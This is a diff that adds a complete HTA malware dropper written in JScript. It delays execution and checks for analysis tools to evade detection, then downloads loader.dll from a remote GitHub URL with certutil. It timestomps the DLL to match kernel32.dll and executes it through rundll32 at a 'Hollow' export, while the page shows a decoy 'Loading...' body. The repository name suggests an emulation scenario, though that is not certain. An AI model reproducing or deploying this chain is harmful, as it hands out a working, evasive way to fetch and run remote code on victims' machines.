@@ -1,0 +1,96 @@
+<html>
+<head>
+<script language="JScript">
+var logPath = "C:\\ProgramData\\Microsoft\\cache\\tray\\cache.dat";
+function log(msg) {
+    try {
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var f = fso.OpenTextFile(logPath, 8, true);
+        var now = new Date();
+        var ts = "[" + now.getFullYear() + "-" + ("0"+(now.getMonth()+1)).slice(-2) + "-" + ("0"+now.getDate()).slice(-2) + " " +
+                 ("0"+now.getHours()).slice(-2) + ":" + ("0"+now.getMinutes()).slice(-2) + ":" + ("0"+now.getSeconds()).slice(-2) + "] ";
+        f.WriteLine(ts + msg);
+        f.Close();
+    } catch(e) {}
+}
+
+log("[*] payload.hta started");
+
+// Stage 1: Delay 60-90s (evade sandbox)
+var delay = Math.floor(Math.random() * 30000) + 60000;
+log("[*] Sandbox evasion delay: " + delay + "ms");
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run("powershell -NoP -Exec Bypass -C \"Start-Sleep -Milliseconds " + delay + "\"", 0, true);
+} catch(e) {
+    log("[-] Delay FAILED: " + e.message);
+}
+
+// Stage 2: Analysis check — enumerate processes for debugging tools
+log("[*] Analysis check: enumerating processes");
+try {
+    var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+    var procs = wmi.ExecQuery("SELECT Name FROM Win32_Process");
+    var tools = ["procmon.exe", "wireshark.exe", "procexp.exe", "vmtoolsd.exe", "x64dbg.exe"];
+    var found = false;
+    var e = new Enumerator(procs);
+    for (; !e.atEnd(); e.moveNext()) {
+        var pname = e.item().Name.toLowerCase();
+        for (var t = 0; t < tools.length; t++) {
+            if (pname.indexOf(tools[t]) >= 0) { found = true; break; }
+        }
+    }
+    if (found) {
+        log("[!] Analysis tools detected — exiting");
+        window.close();
+    }
+    log("[+] Analysis check passed");
+} catch(e) {
+    log("[-] Analysis check FAILED: " + e.message);
+}
+
+// Stage 3: certutil download loader.dll to %TEMP%
+var scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario3/main";
+var loaderDll = shell.ExpandEnvironmentStrings("%TEMP%") + "\\loader.dll";
+log("[*] Downloading loader.dll via certutil -> " + loaderDll);
+try {
+    shell.Run("certutil.exe -urlcache -split -f \"" + scriptBase + "/loader.dll\" \"" + loaderDll + "\"", 0, true);
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    if (fso.FileExists(loaderDll)) {
+        var f = fso.GetFile(loaderDll);
+        log("[+] loader.dll downloaded: " + f.Size + " bytes");
+    } else {
+        log("[-] loader.dll download FAILED (not found after certutil)");
+    }
+} catch(e) {
+    log("[-] certutil download FAILED: " + e.message);
+}
+
+// Stage 4: Timestomp — set timestamps to match kernel32.dll
+log("[*] Timestomping loader.dll");
+try {
+    var kernel32 = fso.GetFile("C:\\Windows\\System32\\kernel32.dll");
+    var staged = fso.GetFile(loaderDll);
+    staged.DateCreated = kernel32.DateCreated;
+    staged.DateLastModified = kernel32.DateLastModified;
+    staged.DateLastAccessed = kernel32.DateLastAccessed;
+    log("[+] Timestomp complete");
+} catch(e) {
+    log("[-] Timestomp FAILED: " + e.message);
+}
+
+// Stage 5: rundll32.exe loader.dll,Hollow
+log("[*] Launching rundll32.exe with loader.dll...");
+try {
+    shell.Run("rundll32.exe \"" + loaderDll + "\",Hollow", 0, true);
+    log("[+] rundll32.exe completed");
+} catch(e) {
+    log("[-] rundll32.exe FAILED: " + e.message);
+}
+
+log("[+] payload.hta complete");
+window.close();
+</script>
+</head>
+<body>Loading...</body>
+</html>
